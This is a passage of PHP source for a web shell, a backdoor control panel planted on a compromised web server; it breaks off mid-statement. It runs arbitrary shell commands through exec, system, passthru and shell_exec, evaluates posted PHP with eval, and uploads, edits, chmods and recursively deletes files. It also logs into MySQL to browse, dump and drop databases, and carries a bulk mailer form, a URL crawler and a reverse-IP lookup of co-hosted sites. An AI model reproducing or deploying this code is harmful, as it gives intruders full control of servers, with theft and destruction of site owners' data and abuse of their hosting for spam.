function c0d3_ex3c($cmd,$dir) {
	global $result;
	@chdir($dir);
	if (is_callable("exec") && !is_disabled("exec")) {
		ob_start("buffer_exec");
		exec($cmd,$resultado);
		echo join("\n",$resultado);
		ob_end_flush();
	}
	elseif (is_callable("system") && !is_disabled("system")) {
		ob_start("buffer_exec");
		system($cmd);
		ob_end_flush();
	}
	elseif (is_callable("passthru") && !is_disabled("passthru")) {
		ob_start("buffer_exec");
		passthru($cmd);
		ob_end_flush();
	}
	elseif (is_callable("shell_exec") && !is_disabled("shell_exec")) {
		ob_start("buffer_exec");
		echo shell_exec($cmd);
		ob_end_flush();
	}
	return $result;
}
	
function rm_dir_pwn($px) {
	$h = @opendir($px);
	while (($item_pwn = @readdir($h)) !== FALSE) {
		if (($item_pwn!= ".") and ($item_pwn != "..")) {
			if (!is_dir($px.$item_pwn)) {
				@unlink($px.$item_pwn);
			}
			else {
				rm_dir_pwn($px.$item_pwn.DIRECTORY_SEPARATOR);
				@rmdir($px.$item_pwn);
			}
		}
	}
	@closedir($h);
	@rmdir($px);
	return !is_dir($px);
}

function rm_items_pwn($o) {
	$is_dir_x = is_dir($o);
	$o = str_replace("\\",DIRECTORY_SEPARATOR,$o);
	if (is_dir($o)) {
		if (substr($o,-1) != DIRECTORY_SEPARATOR) { $o .= DIRECTORY_SEPARATOR; }
		return rm_dir_pwn($o);
	}
	elseif (is_file($o)) {
		return @unlink($o);
	}
	else {
		if ($is_dir_x) {
			$sa_dir=is_dir($o);
			rm_dir_pwn($o);
			if (!$sa_dir) {
				return TRUE;
			}
			else {
				return FALSE;
			}
		}
	}
}

function login_form_mysql() {
	global $lenguaje;
	echo '<div align="center">
	<form method="GET" action="">
	<table width="236" border="0" cellspacing="0" cellpadding="0" align="center">
	<tr>
	<td width="92">Host:</td>
	<td width="144" align="right"><input type="text" name="hostm" id="mysql_host" value="localhost"></td>
	</tr>
	<tr>
	<td>'.$lenguaje[19].'</td>
	<td align="right"><input type="text" name="userm" id="mysql_user"></td>
	</tr>
	<tr>
	<td>'.$lenguaje[20].'</td>
	<td align="right"><input type="text" name="passm" id="mysql_password">
	<input type="hidden" name="id" value="log_mysql"></td>
	</tr>
	</table>
	<br />
	<input type="submit" value="'.$lenguaje[21].'">
	<br />
	</form>
	</div>';
}

function post_form_mysql($host,$user,$pass) {
	global $conexion;
	$conexion=@mysql_pconnect($host, $user, $pass);
	if ($conexion) {
		return true;
	}
	else {
		return false;
	}
}
	
function listar_dbs() {
	global $conexion,$dir,$lenguaje;
	echo '<div align="center"><br /> <a href="?id=mysql_login&d='.$dir.'">'.$lenguaje[25].'</a><br/><br/>
	<table cellspacing=1 cellpadding=2>';
	$mysql_list_db = @mysql_list_dbs($conexion);
	$num = @mysql_num_rows($mysql_list_db);
	for($i=0;$i<$num;$i++) {
		$dbname = @mysql_dbname($mysql_list_db, $i);
		echo '<tr>
		<td>'.htmlspecialchars($dbname).'</td>
		<td><a href="?id=list_tb&userm='.htmlentities($_GET['userm']).'&passm='.htmlentities($_GET['passm']).'&hostm='.htmlentities($_GET['hostm']).'&dbname='.htmlspecialchars($dbname).'">'.$lenguaje[22].'</a></td>
		<td><a href="?id=drop_db&userm='.htmlentities($_GET['userm']).'&passm='.htmlentities($_GET['passm']).'&hostm='.htmlentities($_GET['hostm']).'&dbname='.htmlspecialchars($dbname).'">'.$lenguaje[23].'</a></td>
		<td><a href="?id=dump3r&userm='.htmlentities($_GET['userm']).'&passm='.htmlentities($_GET['passm']).'&hostm='.htmlentities($_GET['hostm']).'&db='.htmlspecialchars($dbname).'">'.$lenguaje[24].'</a></td>
		</tr>';
	}
	echo '</table></div>';
}

function listar_tbs($db) {
	global $conexion,$lenguaje;
	$list_tables=@mysql_list_tables($db);
	$num=@mysql_num_rows($list_tables);
	if ($num) {
		echo '<div align="center">'.htmlspecialchars($db).' - 
		<a href="?id=listar_dbs&userm='.htmlspecialchars($_GET['userm']).'&passm='.htmlspecialchars($_GET['passm']).'&hostm='.htmlspecialchars($_GET['hostm']).'">'.$lenguaje[25].'</a><br/><br/>
		<table cellspacing=1 cellpadding=2>';
		for($i=0;$i<$num;$i++) {
			$nombre_tabla=@mysql_tablename($list_tables, $i);
			echo '<tr>
			<td>
			'.htmlspecialchars($nombre_tabla).'
			</td>
			<td>
			<a href="?id=ver_schema&userm='.htmlentities($_GET['userm']).'&passm='.htmlentities($_GET['passm']).'&hostm='.htmlentities($_GET['hostm']).'&tbname='.htmlspecialchars($nombre_tabla).'&db='.htmlspecialchars($db).'">Schema</a>
			</td>
			<td>
			<a href="?id=mostrar_datos&userm='.htmlentities($_GET['userm']).'&passm='.htmlentities($_GET['passm']).'&hostm='.htmlentities($_GET['hostm']).'&tbname='.htmlspecialchars($nombre_tabla).'&db='.htmlspecialchars($db).'">'.$lenguaje[26].'</a>
			</td>
			<td>
			<a href="?id=drop_tb&userm='.htmlentities($_GET['userm']).'&passm='.htmlentities($_GET['passm']).'&hostm='.htmlentities($_GET['hostm']).'&dbname='.htmlspecialchars($db).'&tbname='.htmlspecialchars($nombre_tabla).'">'.$lenguaje[23].'</a>
			</td>
			<td>
			<a href="?id=dump3r&userm='.htmlentities($_GET['userm']).'&passm='.htmlentities($_GET['passm']).'&hostm='.htmlentities($_GET['hostm']).'&tablename='.htmlspecialchars($nombre_tabla).'&db='.htmlspecialchars($db).'">'.$lenguaje[24].'</a>
			</td>
			</tr>';
		}
		echo '</table></div>';
	}
	else
	{
		echo $lenguaje[27].'<br /> <br /> <a href="?id=listar_dbs&userm='.htmlspecialchars($_GET['userm']).'&passm='.htmlspecialchars($_GET['passm']).'&hostm='.htmlspecialchars($_GET['hostm']).'">'.$lenguaje[25].'</a>';
	}
}
	
function ver_schema($nombre_tabla,$dbname) {
	global $conexion,$lenguaje;
	$query_show_fields = @mysql_db_query($dbname, "SHOW fields FROM $nombre_tabla");
	$num = @mysql_num_rows($query_show_fields);
	echo '<div align="center">';
	echo $nombre_tabla.' -  <a href="?id=list_tb&userm='.htmlspecialchars($_GET['userm']).'&passm='.htmlspecialchars($_GET['passm']).'&hostm='.htmlspecialchars($_GET['hostm']).'&dbname='.htmlspecialchars($dbname).'">'.$lenguaje[25].'</a> <br/><br/>
	<table cellspacing=1 cellpadding=2 border=1>
	<tr>
	<td>'.$lenguaje[29].'</td>
	<td>'.$lenguaje[30].'</td>
	<td>'.$lenguaje[31].'</td>
	<td>'.$lenguaje[32].'</td>
	<td>'.$lenguaje[33].'</td>
	<td>'.$lenguaje[34].'</td>
	</tr>';
	for( $i = 0; $i < $num; $i++ ) {
		$field=@mysql_fetch_array($query_show_fields);
		echo '<tr>
		<td>&nbsp;'.$field['Field'].'</td>
		<td>&nbsp;'.$field['Type'].'</td>
		<td>&nbsp;'.$field['Null'].'</td>
		<td>&nbsp;'.$field['Key'].'</td>
		<td>&nbsp;'.$field['Default'].'</td>
		<td>&nbsp;'.$field['Extra'].'</td>
		</tr>';
	}
	echo '</table>';
	echo '</div>';
}

function paginar($table,$db) {
	global $conexion;
	@mysql_select_db($db);
	$sergio=@mysql_query("SELECT * FROM $table");
	$total_paginas=mysql_num_rows($sergio) / 30;
	for ($pag=0;$pag < $total_paginas;$pag++) {
		$paginas[]='<a href="?id=mostrar_datos&userm='.htmlspecialchars($_GET['userm']).'&passm='.htmlspecialchars($_GET['passm']).'&hostm='.htmlspecialchars($_GET['hostm']).'&tbname='.htmlspecialchars($_GET['tbname']).'&db='.htmlspecialchars($_GET['db']).'&pag='.($pag * 30).'">'.$pag.'</a>';
	}
	echo '<table width="400" border="1" cellpadding="0" cellspacing="0">
	<tr>
	<td align="center">';
	echo '<font style="font-size:9px; font-family: Verdana">';
	$paginas_z=implode(' ',$paginas);
	if ($paginas_z) {
		echo $paginas_z;
	}
	else {
		echo 'Err0r';
	}
	echo '</font></td>
	</tr>
	</table>';
}
	
function mostrar_datos($tablename,$db,$inicio_limit,$fin_limit) {
	global $conexion,$total_paginas,$lenguaje;
	@mysql_select_db($db);
	if ($total_paginas=='1') {
		$query_pwn="SELECT * FROM $tablename";
	}
	else {
		$query_pwn="SELECT * FROM $tablename LIMIT $inicio_limit,$fin_limit";
	}
	$query_columnas=@mysql_query("SHOW COLUMNS FROM $tablename");
	$query_datos=@mysql_query($query_pwn);
	$control_datos=@mysql_fetch_row($query_datos);
	if ($control_datos) {
		@mysql_free_result($query_datos);
		$query_datos=@mysql_query($query_pwn);
		echo '<div align="center">';
		echo '<table cellspacing=1 cellpadding=1 border=1>';
		echo '<tr>';
		while ($columna=@mysql_fetch_row($query_columnas)) {
			echo '<td>'.$columna[0].'</td>';
			$columnas_matriz[]=$columna[0];
			flush();
			ob_flush();
		}
		echo '</tr>';
		while ($datos=@mysql_fetch_row($query_datos)) {
			echo '<tr>';
			for($i=0;$i < count($columnas_matriz);$i++) {
				echo '<td>&nbsp;'.htmlspecialchars($datos[$i]).'</td>';
			}
			flush();
			ob_flush();
			echo '</tr>';
		}
		echo '</table>';
		echo '</div>';
	}
	else {
		echo $lenguaje[35];
	}
}

function dump3r($user,$password,$host,$db,$tablename='') {
	if (!$tablename == '') {
		$filename = $tablename;
	}
	else {
		$filename = $db;
	}
	header("Content-disposition: filename=$filename.sql");
	header("Content-type: application/octetstream");
	header("Pragma: no-cache");
	header("Expires: 0");
	$query_dump = mysql_query("show variables");
	while(1) {
		$array_r0w = mysql_fetch_row($query_dump);
		if ($array_r0w == false) break;
		if ($array_r0w[0] == "basedir")
			$bindir = $array_r0w[1]."bin/";
	}
	echo base64_decode('LS0gRHVtcDNkIE9L');
	echo '
	';
	passthru($bindir."mysqldump --host=$host --user=$user --password=$password $db $tablename");
}

function drop_db($dbname)
	{
	 global $conexion,$lenguaje;
	 if (isset($_POST['ok']))
		{
		 if (mysql_query("DROP DATABASE $dbname", $conexion)) 
			{
			echo '<b>'.$lenguaje[36].'</b><br /><br />';
			listar_dbs();
			} 
		else 
			{
			echo '<b>'.$lenguaje[36].'</b><br /><br />';
			listar_dbs();
			}
		}
	 else
		{
		 echo '<form method="post" action="">'.$lenguaje[38].' '.htmlspecialchars($dbname).' ?
		 <br />
		 <br />
		 <input type="hidden" name="ok" value="1">
		 <input type="submit" value="'.$lenguaje[39].'">
		 </form>';
		}
	}
function drop_tb($tbname,$dbname)
	{
	 global $conexion,$lenguaje;
	 if (isset($_POST['ok']))
		{
		 @mysql_select_db($dbname);
		 if (mysql_query("DROP TABLE $tbname", $conexion)) 
			{
			   echo '<b>'.$lenguaje[40].'</b><br /> <br />';
			   listar_tbs($_GET['dbname']);
			} 
		else 
			{
			   echo '<b>'.$lenguaje[41].'</b><br /> <br />';
			   listar_tbs($_GET['dbname']);
			}
		}
	else
		{
		 echo '<form method="post" action="">'.$lenguaje[42].' '.htmlspecialchars($tbname).' ?
		 <br />
		 <br />
		 <input type="hidden" name="ok" value="1">
		 <input type="submit" value="'.$lenguaje[39].'">
		 </form>';
		}
	}
function form_mailer()
	{
	 global $lenguaje;
	 echo '<form method="post" action="">
	 <table width="655" border="0" cellspacing="0" cellpadding="0">
	 <tr>
	 <td width="115"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">'.$lenguaje[43].': </font></td>
	 <td width="10">&nbsp;</td>
	 <td width="317"><input name="email" type="text" id="email" size="40"></td>
	 <td width="19" rowspan="4">&nbsp;</td>
	 <td width="197"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">'.$lenguaje[44].':</font></td>
	 </tr>
	 <tr>
	 <td><p><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">'.$lenguaje[45].'</font>
	 <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">:</font></p></td>
	 <td height="22">&nbsp;</td>
	 <td><input name="titulo" type="text" id="titulo" size="50"></td>
	 <td rowspan="3"><textarea name="maillist" cols="30" rows="12" id="maillist"></textarea></td>
	 </tr>
	 <tr>
	 <td><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">'.$lenguaje[3].':</font></td>
	 <td>&nbsp;</td>
	 <td><input name="nombre" type="text" id="nombre" size="40"></td>
	 </tr>
	 <tr>
	 <td><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">'.$lenguaje[46].': </font></td>
	 <td valign="top">&nbsp;</td>
	 <td><textarea name="contenido" cols="50" rows="9" id="contenido"></textarea></td>
	 </tr>
	 </table>
	 <div align="center">
	 <input type="submit" value="'.$lenguaje[17].'">
	 </div>
	 </form>';
	}
function crawl3r()
	{
	global $lenguaje;
	echo '<form method="GET" action="">
			<input type="hidden" name="id" value="crawl3r">
			<table width="395" border="0" cellspacing="0" cellpadding="0">
			<tr>
			<td width="95">Link:</td>
			<td width="300"><input type="text" name="url" size="50"></td>
			</tr>
			<tr>
			<td colspan="2" align="center"><br><input type="submit" value="OK"></td>
			</tr>
			</table>
			</form><br />';
	if (((isset($_GET['url'])) and (!isset($_GET['b64_url']))) or (((!isset($_GET['url'])) and (isset($_GET['b64_url'])))))
		{
		if (isset($_GET['url']))
			{
			$str = @file_get_contents($_GET['url']); 
			$url = $_GET['url'];
			echo htmlentities(utf8_decode($url));
			}
		else
			{
			$str = @file_get_contents(base64_decode($_GET['b64_url']));
			$url = base64_decode($_GET['b64_url']);
			echo htmlentities(utf8_decode($url));
			}
			echo '<br /><br />';
		if ($str)
			{
			$doc = new DOMDocument(); 
			@$doc->loadHTML($str);
			$hrefs = $doc->getElementsByTagName('a');
			if ($hrefs)
				{
				echo '<table border="1" cellspacing="0" cellpadding="0">';
				$i=0;
				foreach($hrefs as $href)
					{
					$oki=$href->getAttribute('href');
					if ((trim($oki) != '') && !(@in_array($oki,$matches_href)) && (trim($oki)!='/') && (trim($oki[0])!='#') && (substr(trim($oki), 0, 10)!='javascript'))
						{
						if ($oki[0] != 'h')
							{
							echo '<tr>
							<td>'.$i.'</td>
							<td width="50">-----</td>
							<td>';
							}
						else
							{
							echo '<tr>
							<td>'.$i.'</td>
							<td width="50"><a href="?id=crawl3r&b64_url='.base64_encode($oki).'">Scan it!</a></td>
							<td>';
							}
						if ($oki)
							{
							echo htmlspecialchars(utf8_decode($oki));
							}
						else
							{
							echo '&nbsp;';
							}
						echo '</td>
							</tr>';
						$i++;
						}
					}
				echo '</table>';
				}
			}
		else
			{
			echo $lenguaje[96].' <br /><br /><br />';
			}
		}
	}

function reverse_dns()
	{
	if ($_POST)
		{
		$web = $_POST['url'];
		if (ereg('http://',$web))
			{
			$web=str_replace('http://','',$web);
			}
		if ($web[strlen($web)-1] == '/')
			{
			$web=substr($web,0,-1);
			}
		$ip = gethostbyname($web);
		$source = file_get_contents('http://www.ip-adress.com/reverse_ip/'.$ip);
		preg_match_all('|<a href="/whois/(.*?)">Whois</a>|', $source, $sitios);
		echo 'Web: '.$web.' <br />
			  IP : '.$ip.' <br />
			  Total de sitios (Reverse DNS): '.count($sitios[1]).'<br /><br />';
		foreach ($sitios[1] as $site)
			{
			echo '<a href="http://'.htmlentities($site).'">'.htmlentities($site).'</a><br />';
			}
		}
	else
		{
		echo '<form action="" method="POST">
		<table>
		<tr>
		<td>Url (ej: www.google.com.ar): </td>
		<td><input type="text" name="url"></td>
		<tr/>
		</table>
		<br />
		<input type="submit" value="Checkear">
		</form>';
		}
	}

function pwn_chmod($pwn)
	{
	global $lenguaje;
	$old=substr(sprintf('%o', @fileperms($pwn)), -4);
	if (is_numeric($old))
		{
		if (isset($_POST['nuevos_permisos']))
			{
			if (is_numeric($_POST['nuevos_permisos']))
				{
				if (@chmod($pwn,$_POST['nuevos_permisos']))
					{
					echo $lenguaje[90];
					}
				else
					{
					echo $lenguaje[91];
					}
				}
			else
				{
				echo $lenguaje[92];
				}
			echo '<br /><br />';
			}
		else
			{
			echo realpath($pwn).'<br /><br /><form method="post" action="">
			'.$lenguaje[93].':
			<input type="text" id="old" disabled id="old" readonly="readonly" value="'.$old.'">
			<br /><br />'.$lenguaje[94].':
			<input type="text" name="nuevos_permisos" id="nuevos_permisos">
			<br /><br />
			<input type="submit" value="editar">
			</form><br />';
			}
		}
	else
		{
		echo $lenguaje[89].'<br /><br />';
		}
	}
if (isset($_GET['id']))
	{
	$id_menu=$_GET['id'];
	}
else
	{
	$id_menu='dir';
	}

if ($id_menu == 'icono')
	{
	 mostrar_iconos($_GET['tipo']);
	 exit();
	}
if (($id_menu != 'phpinfo') && ($id_menu!='proxy') && ($id_menu != 'fdown') && ($id_menu!='dump3r'))
	{
	$homedir=getcwd();
	if (isset($_GET['d']))
		{
		$dir=realpath($_GET['d']);
		}
	css();
	header_index();
	echo '<table style="Border-Collapse: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#000000 border=1>
	 <tr valign="middle">
	 <td align="center">'.$lenguaje[52].': 
	 <a href="http://'.gethostbyname($_SERVER["HTTP_HOST"]).'/">'.gethostbyname($_SERVER["HTTP_HOST"]).'</a> | 
	 '.$lenguaje[53].': <b><font color="red">'.$_SERVER["REMOTE_ADDR"].'</font></b> | ';
	 echo 'cURL: <b>';
	 if(function_exists('curl_version'))
		{
		 echo '<font color=#00FF00><b>'.$lenguaje[54].'</b></font></b> | '; 
		}
	 else 
		{ 
		 echo '<font color=red>'.$lenguaje[55].'</font></b> | '; 
		}
	 echo 'MySQL: <b>';
	 if(function_exists('mysql_connect'))
		{
		 echo '<font color=#00FF00><b>'.$lenguaje[54].'</b></font></b> | '; 
		} 
	 else 
		{ 
		 echo '<font color=red>'.$lenguaje[55].'</font></b> | '; 
		}
		
	 echo 'MSSQL: <b>';
	 if(function_exists('mssql_connect'))
		{
		 echo '<font color=#00FF00><b>'.$lenguaje[54].'</b></font></b> | '; 
		} 
	 else 
		{ 
		 echo '<font color=red>'.$lenguaje[55].'</font></b> | '; 
		}
	 echo 'PostgreSQL: <b>';
	 if(function_exists('pg_connect'))
		{
		 echo '<font color=#00FF00><b>'.$lenguaje[54].'</b></font></b> | '; 
		} 
	 else 
		{ 
		 echo '<font color=red>'.$lenguaje[55].'</font></b> | '; 
		}

	 echo 'Perl: <b>';
	 if (c0d3_ex3c('perl -h',$dir)) 
		{
		 echo '<font color=#00FF00><b>'.$lenguaje[54].'</b></font></b> | '; 
		} 
	 else 
		{ 
		 echo '<font color=red>'.$lenguaje[55].'</font></b> | '; 
		}
		
	 echo 'Oracle: <b>';
	 if(function_exists('ocilogon'))
		{
		 echo '<font color=#00FF00><b>'.$lenguaje[54].'</b></font></b>'; 
		} 
	 else 
		{ 
		 echo '<font color=red>'.$lenguaje[55].'</font></b>'; 
		}
	 echo '</td>
	 </tr>
	 <tr valign="top">
	 <td align="center">'.$lenguaje[56].': '.disable_functions().'</td>
	 </tr>
	 </table>';
	 echo '<br />
	 <a href="?">'.$lenguaje[57].'</a> - 
	 <a href="?id=php_exec&d='.$dir.'">'.$lenguaje[58].'</a> - 
	 <a href="?id=mysql_login&d='.$dir.'">MYSQL</a> - 
	 <a href="?id=mail3r">Mailer</a> - 
	 <a href="?id=crawl3r">Crawler</a> -
	 <a href="?id=reverse_dns">Reverse dns</a> -
	 <a href="?id=upload_fil3&d='.$dir.'">'.$lenguaje[84].'</a> - 
	 <a href="?id=f0rm_exec&d='.$dir.'">CMD</a><br /><br />';
	}
if (($id_menu == 'dir') or (!$id_menu))
	{
	 if (trim($dir)=='')
		{
		 $dir = getcwd();
		}
	 listar_archivos($dir);
	}
elseif (($id_menu == 'a_edit') && (!trim($_GET['d']) == '') && (!trim($_GET['a']) == ''))
	{
	 echo '<br /><form method="post" action="">
<input type="submit" value="Save" />
<input type="reset" value="Reset" />
<input type="button" value="Back" onclick="history.go(-1)"><br />
<br />
'.$lenguaje[60].':<br />
<a href="?id=a_edit&amp;d='.$dir.'&amp;a='.urlencode($_GET['a']).'&w='.base64_encode('fread').'">fread</a> - 
<a href="?id=a_edit&amp;d='.$dir.'&amp;a='.urlencode($_GET['a']).'&w='.base64_encode('readfile').'">readfile</a> - 
<a href="?id=a_edit&amp;d='.$dir.'&amp;a='.urlencode($_GET['a']).'&w='.base64_encode('file_get_contents').'">file_get_contents</a><br />
(clic)
<br /><br />';
	if (isset($_POST['c0d3']))
	{
	 $fopen=@fopen(realpath($dir.'/'.$_GET['a']),'w+');
	 $pwz=@fwrite($fopen,stripslashes($_POST['c0d3']));
	 @fclose($fopen);
	 if($pwz)
	  	{
		 echo '<b>OK !!! -> <font color="green">'.$lenguaje[61].'</font></b><br />';
		}
	 else
	 	{
		 echo '<b>Err0r !!! -> <font color="red">'.$lenguaje[62].'</font></b><br />';
		}
	}
	 echo '<textarea name="c0d3" cols="80" rows="20">';
	 if ($_GET['w'] == base64_encode('fread'))
			{
			 $fopen=@fopen(realpath($dir.'/'.$_GET['a']),'r');
			 $tam=@filesize(realpath($dir.'/'.$_GET['a']));
			 if ($tam > 0)
				{
				$read=@fread($fopen,$tam);
				echo htmlentities($read);
				}
			}
	 elseif ($_GET['w'] == base64_encode('readfile'))
			{
			 ob_start("buffer_exec");
			 readfile(realpath($dir.'/'.$_GET['a']));
			 ob_end_flush();
			 echo $result;
			}
	 else
			{
			 echo htmlentities(file_get_contents(realpath($dir.'/'.$_GET['a'])));
			}
	 echo '</textarea></form>';
	}
elseif ($id_menu == 'phpinfo')
		{
		 phpinfo();
		}
elseif ($id_menu == 'php_exec')
	{
	if (isset($_POST['c0d3_3x3c']))
		{
		 @chdir($dir);
		 echo '<textarea cols="100" rows="16" name="phpcode">';
		 ob_start("buffer_exec");
		 eval(stripslashes($_POST['c0d3_3x3c']));
		 ob_end_flush();
		 echo $result;
		 echo '</textarea><br /><br />';
		}
	 echo $lenguaje[63].'<br />
<form method="post" action="">
<textarea name="c0d3_3x3c" cols="80" rows="12">';
if (isset($_POST['c0d3_3x3c']))
	{
	echo stripslashes(htmlspecialchars($_POST['c0d3_3x3c']));
	}
echo '</textarea><br /><br />
<input type="submit" value="OK">
<input type="reset" value="Reset">
</form>';
	}
  elseif (($id_menu == 'upload_fil3') && (isset($_FILES['uploadfile'])))
	{
	 global $_FILES;
	 global $dir;
	 $uploadfile = $_FILES["uploadfile"];
	 if (!empty($uploadfile["tmp_name"]))
 		{
		if (empty($uploadfilename)) 
			{
			 $destin = $uploadfile["name"];
			}
  		else 
		   {
		    $destin = $userfilename;
		   }
		if (!move_uploaded_file($uploadfile["tmp_name"],$dir.'/'.$destin)) 
   		{
		echo $lenguaje[64].' '.$uploadfile["name"].' ('.$lenguaje[65].'"'.$uploadfile["tmp_name"].'" '.$lenguaje[66].' '.$dir.'"!<br />';
		}
		else
		{
		 echo '<font color="green">'.$lenguaje[67].' ("'.$uploadfile["name"].'" '.$lenguaje[66].' -> '.$dir.')</font><br /><br />'; 
		}
		}
	listar_archivos($dir);
	}
	
elseif ($id_menu == 'f0rm_exec')
	{
	f0rm_exec($dir);
	}
	
elseif ($id_menu == 'c0d3_3x3c')
	{
	f0rm_exec($dir);
	echo '<textarea name="c0d3" cols="80" rows="20">'.c0d3_ex3c($_POST['ax3'],$dir).'</textarea><br />';
	}
elseif ($id_menu == 'upload_fil3')
	{
	echo '<b>'.htmlentities($dir).'</b><br /><br />'; 
	upload_file($dir);
	}
elseif (($id_menu == 'rmdir') && (!trim($_GET['d1r']) == ''))
	{
	if (isset($_POST['rm_ok']))
		{
		$rm_dir=rm_items_pwn(realpath($_GET['d1r'].'/'));
		if($rm_dir)
			{
			echo '<b><font color="green">'.$lenguaje[68].'! -> '.htmlentities(stripslashes($_GET['d1r'])).'</font></b><br /><br />';
			}
		else
			{
			echo '<b><font color="red">Err0r !!! -> '.htmlentities(stripslashes($_GET['d1r'])).'</font></b><br /<br />';
			}
		listar_archivos($dir);
		}
	else
		{
		echo $lenguaje[88].' <font color="red"><b>'.htmlentities(stripslashes($_GET['d1r'])).'</b></font> ?<br />
		<form action="" method="POST">
		<input type="hidden" name="rm_ok" value="1">
		<br />
		<input type="submit" value="SI">
		<form>
		<br /><br />';
		}
	}
elseif (($id_menu == 'rm_file') && (!trim($_GET['fil3']) == ''))
	{
	if ((isset($_POST['rm_ok'])) && ($_POST['rm_ok']==1))
		{
		$unlink_fil3=@unlink($_GET['fil3']);
		if($unlink_fil3)
			{
			echo '<b><font color="green">'.$lenguaje[69].'! -> '.htmlentities(stripslashes($_GET['fil3'])).'</font></b><br /><br />';
			}
		  else
			{
			echo '<b><font color="red">Err0r !!!  -> '.htmlentities(stripslashes($_GET['fil3'])).'</font></b><br /><br />';
			}
		listar_archivos($dir);
		}
	else
		{
		echo $lenguaje[87].' <font color="red"><b>'.htmlentities(stripslashes($_GET['fil3'])).'</b></font> ?<br /><form action="" method="POST">
		<input type="hidden" name="rm_ok" value="1">
		<br />
		<input type="submit" value="SI">
		<form>
		<br /><br />';
		}
	}
elseif (($id_menu == 'mkdir') && (!trim($_GET['d']) == ''))
	{
	if (isset($_POST['dir_name']))
		{
		 $mkdir_f=@mkdir($dir.'/'.trim($_POST['dir_name']));
		 if($mkdir_f)
			{
			 echo '<b><font color="green">'.$lenguaje[70].'! -> '.htmlentities($_POST['dir_name']).'</font></b><br /><br />';
			}
		 else
			{
			 echo '<b><font color="red">Err0r !!!</font></b><br /><br />';
			}
		}
	else
		{
		 echo '<form method="post" action="">
		 <table width="214" border="0" cellspacing="0" cellpadding="0">
		 <tr valign="top">
		 <td width="58" height="30">'.$lenguaje[71].': </td>
		 <td width="144"><input type="text" name="dir_name" /></td>
		 </tr>
		 <tr valign="top" align="center">
		 <td colspan="2"><input type="submit" value="'.$lenguaje[72].'" /></td>
		 </tr>
		 </table>
		 </form>';
		 }
	listar_archivos($dir);
	}
	
elseif (($id_menu == 'mkfile') && (isset($_GET['d'])))
	{
	if (isset($_POST['fil3_name']))
		{
		 $fopen=@fopen($dir.'/'.$_POST['fil3_name'],'w+');
	 	 @fwrite($fopen,stripslashes($_POST['fil3_content']));
		 @fclose($fopen);
		 if($fopen)
			{
			 echo '<b><font color="green">'.$lenguaje[73].'! -> '.htmlentities($_POST['fil3_name']).'</font></b><br /><br />';
			}
		 else
			{
			 echo '<b><font color="red">Err0r!!!</font></b><br /><br />';
			}
		 listar_archivos($dir);
		}
	else
		{
		 echo '<form method="post" action="">
		 <table border="0" cellspacing="0" cellpadding="0">
		 <tr valign="top">
		 <td height="30">'.$lenguaje[74].': </td>
		 <td width="140"> 
		 <input type="text" name="fil3_name" />
		 </td>
		 </tr>
		 <tr valign="top" align="center">
		 <td colspan="2"><input type="submit" value="'.$lenguaje[75].'" /></td>
		 </tr>
		 </table> 
		 <br />
		 <textarea name="fil3_content" cols="80" rows="12"></textarea>
		 </form>';
		}

	}
elseif (($id_menu == 'fdown') && (!trim($_GET['fil3_down']) == ''))
	{
	 if (!trim($_GET['fil3_path'])=='')
		{
		 $fil3_down=str_replace(" ","_",$_GET['fil3_down']);
		 $fil3_path=$_GET['fil3_path'];
		 $fp = @fopen($fil3_path, 'rb');
		 header('Content-Disposition: attachment; filename='.$fil3_down);
		 header('Content-Length: '.filesize($fil3_path));
		 fpassthru($fp);
		 @fclose($fp);
		}
	 else
		{
		$homedir=getcwd();
		$dir=realpath($_GET['d']);
		css();
		header_index();
		echo $lenguaje[76].' <br /> <br />';
		echo '<a href="'.$_SERVER['SCRIPT_NAME'].'">'.$lenguaje[77].'</a>';
		}
	}
if ($id_menu=='log_mysql') {
	if ((!$_GET['userm']=='') && (!$_GET['hostm']=='')) {
		if (post_form_mysql($_GET['hostm'],$_GET['userm'],$_GET['passm'])) {
			echo '<div align="center">'.$lenguaje[78].': <br /><br />
			<a href="?id=listar_dbs&userm='.base64_encode($_GET['userm']).'&passm='.base64_encode($_GET['passm']).'&hostm='.base64_encode($_GET['hostm']).'">'.$lenguaje[79].'</a><br />
			 <a href="?">'.$lenguaje[80].'</a></div>';
			}
			else {
				echo $lenguaje[81];
			}
		}
		else {
			echo 'Error<br />';
		}
	}
	elseif ($id_menu=='listar_dbs') {
		if (post_form_mysql($hostm,$userm,$passm)) {
			listar_dbs();
		}
		else {
			echo $lenguaje[81]; 
		}
	}
	elseif ($id_menu=='list_tb') {
		if (post_form_mysql($hostm,$userm,$passm)) {
			listar_tbs($_GET['dbname']);
		}
		else {
			echo $lenguaje[81];
		}
	}
	elseif (($id_menu=='ver_schema') && (!$_GET['tbname']=='') && (!$_GET['db']=='')) {
		if (post_form_mysql($hostm,$userm,$passm)) {
			ver_schema($_GET['tbname'],$_GET['db']);
		}
		else {
			echo $lenguaje[81];
		}
	}
	elseif (($id_menu=='mostrar_datos') && (!$_GET['tbname']=='')) {
		if (post_form_mysql($hostm,$userm,$passm)) {
			echo '<a href="?id=list_tb&userm='.htmlspecialchars($_GET['userm']).'&passm='.htmlspecialchars($_GET['passm']).'&hostm='.htmlspecialchars($_GET['hostm']).'&dbname='.htmlspecialchars($_GET['db']).'">'.$lenguaje[25].'</a><br /><br />';
			$paginaz=$_GET[pag];
			if (trim($paginaz)=='') {
				$paginaz=0;
			}
			if (is_numeric($paginaz)) {
				paginar($_GET['tbname'],$_GET['db']);
				echo '<br />';
				mostrar_datos($_GET['tbname'],$_GET['db'],$paginaz,30);
			}
		}
		else {
			echo $lenguaje[81];
		}
	}
	elseif (($id_menu=='dump3r') && (isset($_GET['db']))) {
		if (isset($_GET['tablename'])) {
			dump3r($userm,$passm,$hostm,$_GET['db'],$_GET['tablename']);
		} 
		else {
			dump3r($userm,$passm,$hostm,$_GET['db'],'');
		}
	}
	elseif (($id_menu=='drop_db') && (!$_GET['dbname']=='')) {
		if (post_form_mysql($hostm,$userm,$passm)) {
			drop_db($_GET['dbname']);
		}
		else {
			echo $lenguaje[81];
		}
	}
	elseif (($id_menu=='drop_tb') && (!$_GET['dbname']=='') && (!$_GET['tbname']=='')) {
		if (post_form_mysql($hostm,$userm,$passm)) {
